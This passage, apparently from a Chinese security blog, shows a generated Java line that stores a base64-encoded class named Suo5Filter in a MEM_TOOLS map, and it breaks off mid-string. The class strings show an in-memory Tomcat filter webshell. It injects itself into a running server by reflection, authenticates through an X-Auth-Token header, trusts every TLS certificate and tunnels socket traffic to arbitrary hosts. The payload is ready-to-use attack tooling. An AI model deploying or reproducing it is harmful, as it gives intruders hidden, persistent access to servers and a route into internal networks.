<figure data-type="image" tabindex="4"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852569.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852569.png" alt="img" loading="lazy"></a></figure>
<figure data-type="image" tabindex="5"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852405.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852405.png" alt="img" loading="lazy"></a></figure>
<p>生成结果如下：</p>
<pre><code class="language-java">MEM_TOOLS.put(&quot;Suo5Filter&quot;, &quot;yv66vgAAADQEHgoBGgJLCQDtAkwJAO0CTQgCTgkA7QJPCAJQCQDtAlEIAlIJAO0CUwkA7QJUCQDtAlUIAlYKACoCVwoAKgJYCAJZCgDtAloKAO0CWwgCXAoCXQJeCAJfCgAqAmAIAmEKAB4CYgcCYwoAGAJLCAJkCgAYAmUIAmYKABgCZwcCaAoAHgJpBwJqCgJrAmwKACACbQoAKgJuBwE7CAJvCgAeAnAIAnEKACoCcggCcwcCdAgCdQoAKgJ2CAJ3CAJ4CgAqAnkKARoCegoBGgJ7CAJ8CgJ9An4KACoCfwoCfQKABwKBCgJ9AoIKADYCgwoANgKECgAqAoUHAoYKAO0ChwgCiAsAVwKJCgDtAooIAosKACoCjAcCjQoAQgKOBwKPCgBEAksIApAIApEIApILAFgCkwsAVwKUCwBYApQKAO0ClQoARAKWCAKXCgA7AmcLAFgCmAoARAJnCgKZApoKApkCmwoCmQKcCgAeAp0HAW0HAp4HAp8IAqAIAqEKAB4CoggCowgBHAoAHgKkCgKlAqYKAqUCpwgBHgsAVwKoCgJdAqkKACoCqgsCqwKsCAKtBwKuBwKvBwKwCAKxCQKyArMKAqUCtAsCqwK1CQK2ArcKArgCuQsBiwK6CAK7CgJrAqYJArICvAgCvQgCvggBfAgCvwoAKgLACgJdAsEIAsIKADsCwwgCxAgCxQgCxggCxwgCyAgCyQsCygLLCALMCgDtAs0IAs4KAO0CzwoA7QLQBwLRCwBYAtIIAtMIAtQLAFgC1QcC1goAjQJLCgCNAtcKAtgC2QoC2ALaBQAAAAAAAADICgDvAtsLAFcC3AcC3QoAlgLeCgCWAt8HAuAKAJkC4QoAmQLiCgCZAuMKAJkC5AoAmQLlBwLmCgAeAucHAugKAJ8C6QgC6goC6wLsBwLtCgLrAu4KAusC7woAnwLwCwBXAvELAvIC8wsC8gL0CgCZAvUKAJkC9goA7QL3CgEAAvgKAQACmwoBAAKcCgCZAvkLAFcC%2BgoA7QL7CwBYAvwHAv0KALYCSwgC%2FgoAtgL%2FCAFbCAMABwMBCgC8AksKALYDAgsDAwMECwMFAwYLAwUDBwoAtgKnCgC8AwgKALwC%2BAoA7QMJCgC8AwoKAwsDDAoDCwMNCgMLAw4KAwsDDwoDCwMQBwMRCgDMAxIKAMwDEwoDCwMUCgMLAxUKAwsDFgMCAAAABwMXCAMYCgDTAt4IAxkKADsC3goDGgMbCAMcCgDtAx0IAx4HAx8KANwDEgoA7QMgCwBYAyEIAyIIAyMIAyQIAf8KAyUDJgcDJwoA5QJLBwMoCgDnAykKAOUDKgoA7QMrCgDlAvYKAOUDLAcDLQoA7QMuBwMvBwMwCgDvAzEKAO8DMgoA7QMzCgDlApwKAO8DNAoC2AM1CgDtAzYLAFcDNwsDOAKoCAM5CgC2AzoKAO0DOwoA7QM8CgCZAz0LAqsDPgcDPwoA7QNACgCZAywLAqsDQQsCqwNCCgDtA0MKAQcDRAcDRQoBBwNGBwNHCgEJA0gKACoDSQoDSgNLCgCWA0wJAO0DTQoAtgNOBwNPCANQBwNRCANSCANTCANUCANVCANWCANXCgDtA1gHA1kHA1oBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQACY3MBABJMamF2YS9sYW5nL1N0cmluZzsBAARwYXRoAQAFdG9rZW4BAAVhZGRycwEAE0xqYXZhL3V0aWwvSGFzaE1hcDsBAAlTaWduYXR1cmUBADpMamF2YS91dGlsL0hhc2hNYXA8TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9Cb29sZWFuOz47AQAJZ0luU3RyZWFtAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAKZ091dFN0cmVhbQEAFkxqYXZhL2lvL091dHB1dFN0cmVhbTsBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAHExjb20vc3VtbWVyc2VjL3gvU3VvNUZpbHRlcjsBAC4oTGphdmEvaW8vSW5wdXRTdHJlYW07TGphdmEvaW8vT3V0cHV0U3RyZWFtOylWAQACaW4BAANvdXQBAAx4b3JCNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQADc3JjAQADa2V5AQAGcmVzdWx0AQACW0IBAApFeGNlcHRpb25zAQAGYmFzZTY0AQAYKFtCTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAGQmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAVjb2RlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAA2I2NAEABG1vZGUBAApjbGFzc2J5dGVzAQANU3RhY2tNYXBUYWJsZQcCaAcCagEAA3hvcgEACChbQltCKVtCAQABaQEAAUkBAARkYXRhAQACbWwBAAJrbAEAA3B3ZAEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAANtZDUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAAW0BAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAAXMBAANyZXQHAnQHAoYBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAEdmFyNwEAA29iagEABm91dHB1dAEAGExqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwEABXRhZ19zAQAFdGFnX2UHAy0HAo8BAAhwYXJzZU9iagEAFShMamF2YS9sYW5nL09iamVjdDspVgEAE1tMamF2YS9sYW5nL09iamVjdDsBAAVjbGF6egEAA3JlcQEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAhyZXF1ZXN0MgEABHJlc3ABAAR2YXI4AQAJYWRkRmlsdGVyAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAlmaWx0ZXJNYXABAAV2YXIyNAEADGZpbHRlck1hcE9iagEABG5hbWUBABFmaWx0ZXJTdGFydE1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAOZmluZEZpbHRlck1hcHMBAApmaWx0ZXJNYXBzAQANdG1wRmlsdGVyTWFwcwEABWluZGV4AQAFdmFyMjcBAAV2YXIyOAEABXZhcjExAQAFdmFyMjUBAAxjb250ZXh0RmllbGQBABJhcHBsaWNhdGlvbkNvbnRleHQBAC1Mb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL0FwcGxpY2F0aW9uQ29udGV4dDsBAA9zdGFuZGFyZENvbnRleHQBACpMb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkQ29udGV4dDsBAApzdGF0ZUZpZWxkAQASZmlsdGVyUmVnaXN0cmF0aW9uBwNcAQAHRHluYW1pYwEADElubmVyQ2xhc3NlcwEAKkxqYXZheC9zZXJ2bGV0L0ZpbHRlclJlZ2lzdHJhdGlvbiREeW5hbWljOwEADnNlcnZsZXRDb250ZXh0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldENvbnRleHQ7AQAGZmlsdGVyAQAWTGphdmF4L3NlcnZsZXQvRmlsdGVyOwEACmZpbHRlck5hbWUBAAN1cmwHA10HA1oHA14HAq4HAq8HA1wHA18HAtEBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsHA2ABAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAVhZ2VudAEAC2NvbnRlbnRUeXBlAQAEc1JlcQEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEABXNSZXNwAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEABWNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47BwNhBwNiBwNjBwKeBwKfAQAHZGVzdHJveQEAGnJlYWRJbnB1dFN0cmVhbVdpdGhUaW1lb3V0AQAbKExqYXZhL2lvL0lucHV0U3RyZWFtO1tCSSlWAQAKcmVhZExlbmd0aAEACnJlYWRSZXN1bHQBAAJpcwEADXRpbWVvdXRNaWxsaXMBAAxidWZmZXJPZmZzZXQBAA1tYXhUaW1lTWlsbGlzAQABSgcDZAEACHJlZGlyZWN0AQBqKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZhL3V0aWwvSGFzaE1hcDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbmV0L0h0dHBVUkxDb25uZWN0aW9uOwEAA2N0eAEAGkxqYXZheC9uZXQvc3NsL1NTTENvbnRleHQ7AQABawEAB2RhdGFNYXABAARyVXJsAQAGbWV0aG9kAQABdQEADkxqYXZhL25ldC9VUkw7AQAEY29ubgEAHExqYXZhL25ldC9IdHRwVVJMQ29ubmVjdGlvbjsBAAdoZWFkZXJzAQAXTGphdmEvdXRpbC9FbnVtZXJhdGlvbjsBAARyb3V0AQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAKUxqYXZhL3V0aWwvSGFzaE1hcDxMamF2YS9sYW5nL1N0cmluZztbQj47AQArTGphdmEvdXRpbC9FbnVtZXJhdGlvbjxMamF2YS9sYW5nL1N0cmluZzs%2BOwcC3QcC4AcDZQEAgChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YS91dGlsL0hhc2hNYXA8TGphdmEvbGFuZy9TdHJpbmc7W0I%2BO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9uZXQvSHR0cFVSTENvbm5lY3Rpb247AQANdHJ5RnVsbER1cGxleAEAUihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAAluZXdDcmVhdGUBABYoQilMamF2YS91dGlsL0hhc2hNYXA7AQABQgEAB25ld0RhdGEBABcoW0IpTGphdmEvdXRpbC9IYXNoTWFwOwEABm5ld0RlbAEAFSgpTGphdmEvdXRpbC9IYXNoTWFwOwEACW5ld1N0YXR1cwEACnUzMnRvQnl0ZXMBAAUoSSlbQgEACmJ5dGVzVG9VMzIBAAUoW0IpSQEABWJ5dGVzAQAHbWFyc2hhbAEAFyhMamF2YS91dGlsL0hhc2hNYXA7KVtCAQAFdmFsdWUBAANidWYBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQAEZGJ1ZgEAFUxqYXZhL25pby9CeXRlQnVmZmVyOwcDAQcDZgcC%2FQcDZwEALShMamF2YS91dGlsL0hhc2hNYXA8TGphdmEvbGFuZy9TdHJpbmc7W0I%2BOylbQgEACXVubWFyc2hhbAEAKihMamF2YS9pby9JbnB1dFN0cmVhbTspTGphdmEvdXRpbC9IYXNoTWFwOwEABGtMZW4BAAFTAQAEdkxlbgEABnJlYWRlcgEAGUxqYXZhL2lvL0RhdGFJbnB1dFN0cmVhbTsBAAZoZWFkZXIBAAJiYgEAA2xlbgEAAXgBAAJicwcDaAcDEQEAQChMamF2YS9pby9JbnB1dFN0cmVhbTspTGphdmEvdXRpbC9IYXNoTWFwPExqYXZhL2xhbmcvU3RyaW5nO1tCPjsBAA5wcm9jZXNzRGF0YUJpbwEAAnNjAQARTGphdmEvbmV0L1NvY2tldDsBAAFwAQAOcmVxSW5wdXRTdHJlYW0BAAlyZXFSZWFkZXIBAB1MamF2YS9pby9CdWZmZXJlZElucHV0U3RyZWFtOwEABmFjdGlvbgEADXJlc3BPdXRTdHJlYW0BAARob3N0AQAEcG9ydAEAC3NjT3V0U3RyZWFtAQAKc2NJblN0cmVhbQEAAXQBABJMamF2YS9sYW5nL1RocmVhZDsHAx8HAz8HAycHAy8BAApyZWFkU29ja2V0AQAvKExqYXZhL2lvL0lucHV0U3RyZWFtO0xqYXZhL2lvL091dHB1dFN0cmVhbTtaKVYBAAFuAQAHZGF0YVRtcAEAC2lucHV0U3RyZWFtAQAMb3V0cHV0U3RyZWFtAQALbmVlZE1hcnNoYWwBAAFaAQAHcmVhZEJ1ZgEAB3JlYWRSZXEBADYoTGphdmEvaW8vQnVmZmVyZWRJbnB1dFN0cmVhbTtMamF2YS9pby9PdXRwdXRTdHJlYW07KVYBAA5idWZJbnB1dFN0cmVhbQEAD3NvY2tldE91dFN0cmVhbQEAEHByb2Nlc3NEYXRhVW5hcnkBAAhyZWFkRnJvbQEACGNsaWVudElkAQAMcmVkaXJlY3REYXRhAQAMbmVlZFJlZGlyZWN0AQALcmVkaXJlY3RVcmwBAANydW4BAAtjb2xsZWN0QWRkcgEACmlmYWNlSW5kZXgBAARhZGRyAQAWTGphdmEvbmV0L0luZXRBZGRyZXNzOwEAA25pZgEAG0xqYXZhL25ldC9OZXR3b3JrSW50ZXJmYWNlOwEACWFkZHJlc3NlcwEABG5pZnMBAC9MamF2YS91dGlsL0VudW1lcmF0aW9uPExqYXZhL25ldC9JbmV0QWRkcmVzczs%2BOwEANExqYXZhL3V0aWwvRW51bWVyYXRpb248TGphdmEvbmV0L05ldHdvcmtJbnRlcmZhY2U7PjsHA0UHA0cBADwoKUxqYXZhL3V0aWwvSGFzaE1hcDxMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL0Jvb2xlYW47PjsBAAtpc0xvY2FsQWRkcgEAFShMamF2YS9sYW5nL1N0cmluZzspWgEAAmlwAQAGdmVyaWZ5AQAvKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZheC9uZXQvc3NsL1NTTFNlc3Npb247KVoBAAhob3N0bmFtZQEAB3Nlc3Npb24BABpMamF2YXgvbmV0L3NzbC9TU0xTZXNzaW9uOwEAEmNoZWNrQ2xpZW50VHJ1c3RlZAEAOihbTGphdmEvc2VjdXJpdHkvY2VydC9YNTA5Q2VydGlmaWNhdGU7TGphdmEvbGFuZy9TdHJpbmc7KVYBACVbTGphdmEvc2VjdXJpdHkvY2VydC9YNTA5Q2VydGlmaWNhdGU7AQAIYXV0aFR5cGUHA2kBABJjaGVja1NlcnZlclRydXN0ZWQBABJnZXRBY2NlcHRlZElzc3VlcnMBACcoKVtMamF2YS9zZWN1cml0eS9jZXJ0L1g1MDlDZXJ0aWZpY2F0ZTsBAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAHRW5jb2RlcgEABHZhcjYBAAxiYXNlNjREZWNvZGUBAAdkZWNvZGVyAQAEdmFyNQEAA3N0cgEACDxjbGluaXQ%2BAQAKU291cmNlRmlsZQEAD1N1bzVGaWx0ZXIuamF2YQwBLAEtDAEcAR0MAR4BHwEABVVURi04DAEgASEBABAvZmF2aWNvbmRlbW8uaWNvDAEiASEBAAAMASMBIQwBKAEpDAEqASsBABA%2FPz8%2FPz8%2FPz8%2FPz8%2FPz8%2FDANqA2sMA2wDbQEABkRlY29kZQwBPQE%2BDAFJAUoBAAxqYXZhLnZlcnNpb24HA24MA28BWAEAAzEuOQwDcANxAQAQamF2YS51dGlsLkJhc2U2NAwDcgNzAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBAANnZXQMA3QDdQEAAXIMA3YBdQEAD2phdmEvbGFuZy9DbGFzcwwDdwN4AQAQamF2YS9sYW5nL09iamVjdAcDXwwDeQN6DAN7A3wMA30BdQEAD3N1bi5taXNjLkJBU0U2NAwDfgN%2FAQAGRW5jb2RlDAFfAWABAAxlbmNvZGVCdWZmZXIBABBqYXZhL2xhbmcvU3RyaW5nAQABDQwDgAOBAQABCgEADGRlY29kZUJ1ZmZlcgwBLAOCDAEsAVEMA4MDhAEAA01ENQcDhQwDhgOHDAOIA4kMA4oDiwEAFGphdmEvbWF0aC9CaWdJbnRlZ2VyDAOMA20MASwDjQwDdgNrDANqA44BABNqYXZhL2xhbmcvRXhjZXB0aW9uDAFrAWwBAAxYLUF1dGgtVG9rZW4MA48BWAwBNgE3AQACOjoMA5ADkQEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAEsA5IBABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyAQAEPCEtLQEAAiE%2BAQAJdGV4dC9odG1sDAOTA5QMA5UDlAwBdAF1DAN0A5YBAAlFUlJPUjovLyAMA5cDmAcDmQwDmgOUDAObAS0MA5wBLQwDnQOeAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAdamF2YXguc2VydmxldC5qc3AuUGFnZUNvbnRleHQBAApnZXRSZXF1ZXN0DAOfA3gBAAtnZXRSZXNwb25zZQwDoAOhBwNeDAOiA6MMAmQDpAwDpQOmDAOnA6gMA6kDqgcDXQwDqwOsAQAHY29udGV4dAEAK29yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9BcHBsaWNhdGlvbkNvbnRleHQBAChvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRDb250ZXh0AQAmb3JnL2FwYWNoZS9jYXRhbGluYS91dGlsL0xpZmVjeWNsZUJhc2UBAAVzdGF0ZQcDrQwDrgOvDAOwA7EMAXQDsgcDswwDtAO1BwO2DAO3A7gMA7kDugEAC2ZpbHRlclN0YXJ0DAO7A68BAC9vcmcuYXBhY2hlLnRvbWNhdC51dGlsLmRlc2NyaXB0b3Iud2ViLkZpbHRlck1hcAEAJG9yZy5hcGFjaGUuY2F0YWxpbmEuZGVwbG95LkZpbHRlck1hcAEADWdldEZpbHRlck5hbWUMA7wCMQwDvQO%2BAQAGUnVuaW5nDAO%2FAXUBAAdBbHJlYWR5AQAFUHJveHkBAAJVUAEAClVzZXItQWdlbnQBAAxDb250ZW50LVR5cGUBAG5Nb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNi4wOyBOZXh1cyA1IEJ1aWxkL01SQTU4TikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOS4xLjIuMwcDYwwBogPAAQARYXBwbGljYXRpb24vcGxhaW4MAdIB0wEAGGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQwB%2FAHTDAIcAdMBABNqYXZhL2xhbmcvVGhyb3dhYmxlDAPBA8IBAARWYXJ5AQACTm8MA8MDxAEADmphdmEvdXRpbC9EYXRlDAPFA6gHA2gMA8YDiQwDxwPIDAPJA8oMA3cBdQEADGphdmEvbmV0L1VSTAwBLAOUDAPLA8wBABpqYXZhL25ldC9IdHRwVVJMQ29ubmVjdGlvbgwDzQOUDAPOA8IMA88DwgwD0AOjDAPRA6MBACBqYXZheC9uZXQvc3NsL0h0dHBzVVJMQ29ubmVjdGlvbgwD0gFgAQAeamF2YXgvbmV0L3NzbC9Ib3N0bmFtZVZlcmlmaWVyDAPTA9QBAANTU0wHA9UMA4YD1gEAGmphdmF4L25ldC9zc2wvVHJ1c3RNYW5hZ2VyDAGdA9cMA9gD2QwD2gPbDAPcA90HA2UMA94DngwD3wN%2FDAPgA8QMA%2BED4gwB4QHiDAPjA4IMA%2BQDiQwD5QPmDAGyAbMMA%2BED5wEAEWphdmEvdXRpbC9IYXNoTWFwAQACYWMMA%2BgD6QEAAmR0AQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0MA%2BoD6wcD7AwD7QPuBwNmDAPvA54MA%2FADfwwD4wPCDAHcAd0MA%2FEDbQcDZwwD8gPzDAP0A%2FMMA%2BgD9QwD6AP2DAP3A20BABdqYXZhL2lvL0RhdGFJbnB1dFN0cmVhbQwBLAP4DAP5A4IMA%2FoD9gwD%2BwOJDAJkA%2FwBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQALaW52YWxpZCBsZW4BAA1rZXkgbGVuIGVycm9yBwP9DAP%2BA%2F8BAA92YWx1ZSBsZW4gZXJyb3IMAd4B3wEAC3ZhbHVlIGVycm9yAQAbamF2YS9pby9CdWZmZXJlZElucHV0U3RyZWFtDAHtAe4MBAADwgEAEVgtQWNjZWwtQnVmZmVyaW5nAQACbm8BAAFoBwQBDAQCA3EBAA9qYXZhL25ldC9Tb2NrZXQBABpqYXZhL25ldC9JbmV0U29ja2V0QWRkcmVzcwwBLAQDDAQEBAUMAdsB1QwD5QQGAQAaY29tL3N1bW1lcnNlYy94L1N1bzVGaWx0ZXIMASwBMwEAEGphdmEvbGFuZy9UaHJlYWQBABJqYXZhL2xhbmcvUnVubmFibGUMASwEBwwECAEtDAIYAhkMBAkBLQwDxwHfDAHXAdgMBAoECwcEDAEAAmlkDAQNA6QMAjACMQwBvAG9DAQOAS0MBA8EEAEAFGphdmEvaW8vT3V0cHV0U3RyZWFtDAHZAdoMBBEEEgwEEwOUDAIPAhAMBBQD3QEAGWphdmEvbmV0L05ldHdvcmtJbnRlcmZhY2UMBBUD3QEAFGphdmEvbmV0L0luZXRBZGRyZXNzDAQWAXUMBBcEGAcEGQwDqQQaDAQbAXUMASQBJQwEHAFgAQAiamF2YS9zZWN1cml0eS9jZXJ0L1g1MDlDZXJ0aWZpY2F0ZQEACmdldEVuY29kZXIBABJbTGphdmEvbGFuZy9DbGFzczsBAA5lbmNvZGVUb1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIBAAZlbmNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAKZ2V0RGVjb2RlcgEABmRlY29kZQwCIwHaAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAUamF2YXgvc2VydmxldC9GaWx0ZXIHBB0BAChqYXZheC9zZXJ2bGV0L0ZpbHRlclJlZ2lzdHJhdGlvbiREeW5hbWljAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0Q29udGV4dAEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAHmphdmEvbGFuZy9JbnRlcnJ1cHRlZEV4Y2VwdGlvbgEAFWphdmEvdXRpbC9FbnVtZXJhdGlvbgEAEmphdmEvdXRpbC9JdGVyYXRvcgEAE2phdmEvbmlvL0J5dGVCdWZmZXIBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAnamF2YS9zZWN1cml0eS9jZXJ0L0NlcnRpZmljYXRlRXhjZXB0aW9uAQAJc3Vic3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQAJY29tcGFyZVRvAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAt0b0xvd2VyQ2FzZQEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAdyZXBsYWNlAQBEKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylMamF2YS9sYW5nL1N0cmluZzsBAAUoW0IpVgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsBABtqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3QBAAtnZXRJbnN0YW5jZQEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldEhlYWRlcgEABXNwbGl0AQAnKExqYXZhL2xhbmcvU3RyaW5nOylbTGphdmEvbGFuZy9TdHJpbmc7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWAQAOc2V0Q29udGVudFR5cGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABRzZXRDaGFyYWN0ZXJFbmNvZGluZwEALChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFcHJpbnQBAAVmbHVzaAEABWNsb3NlAQAHaXNBcnJheQEAAygpWgEAEWdldERlY2xhcmVkTWV0aG9kAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABFnZXRTZXJ2bGV0Q29udGV4dAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldENvbnRleHQ7AQAIbmFub1RpbWUBAAMoKUoBAAd2YWx1ZU9mAQAVKEopTGphdmEvbGFuZy9TdHJpbmc7AQAVZ2V0RmlsdGVyUmVnaXN0cmF0aW9uAQA2KExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvc2VydmxldC9GaWx0ZXJSZWdpc3RyYXRpb247AQAib3JnL2FwYWNoZS9jYXRhbGluYS9MaWZlY3ljbGVTdGF0ZQEADVNUQVJUSU5HX1BSRVABACRMb3JnL2FwYWNoZS9jYXRhbGluYS9MaWZlY3ljbGVTdGF0ZTsBAANzZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYBAFQoTGphdmEvbGFuZy9TdHJpbmc7TGphdmF4L3NlcnZsZXQvRmlsdGVyOylMamF2YXgvc2VydmxldC9GaWx0ZXJSZWdpc3RyYXRpb24kRHluYW1pYzsBABxqYXZheC9zZXJ2bGV0L0Rpc3BhdGNoZXJUeXBlAQAHUkVRVUVTVAEAHkxqYXZheC9zZXJ2bGV0L0Rpc3BhdGNoZXJUeXBlOwEAEWphdmEvdXRpbC9FbnVtU2V0AQACb2YBACUoTGphdmEvbGFuZy9FbnVtOylMamF2YS91dGlsL0VudW1TZXQ7AQAYYWRkTWFwcGluZ0ZvclVybFBhdHRlcm5zAQAqKExqYXZhL3V0aWwvRW51bVNldDtaW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAHU1RBUlRFRAEAEGVxdWFsc0lnbm9yZUNhc2UBAAlhcnJheWNvcHkBACooTGphdmEvbGFuZy9PYmplY3Q7SUxqYXZhL2xhbmcvT2JqZWN0O0lJKVYBAApnZXRNZXNzYWdlAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgEACXNldFN0YXR1cwEABChJKVYBAAlzZXRIZWFkZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KVYBAAdnZXRUaW1lAQAJYXZhaWxhYmxlAQAEcmVhZAEAByhbQklJKUkBAAVzbGVlcAEABChKKVYBAA5vcGVuQ29ubmVjdGlvbgEAGigpTGphdmEvbmV0L1VSTENvbm5lY3Rpb247AQAQc2V0UmVxdWVzdE1ldGhvZAEAEXNldENvbm5lY3RUaW1lb3V0AQAOc2V0UmVhZFRpbWVvdXQBAAtzZXREb091dHB1dAEACnNldERvSW5wdXQBAAppc0luc3RhbmNlAQATc2V0SG9zdG5hbWVWZXJpZmllcgEAIyhMamF2YXgvbmV0L3NzbC9Ib3N0bmFtZVZlcmlmaWVyOylWAQAYamF2YXgvbmV0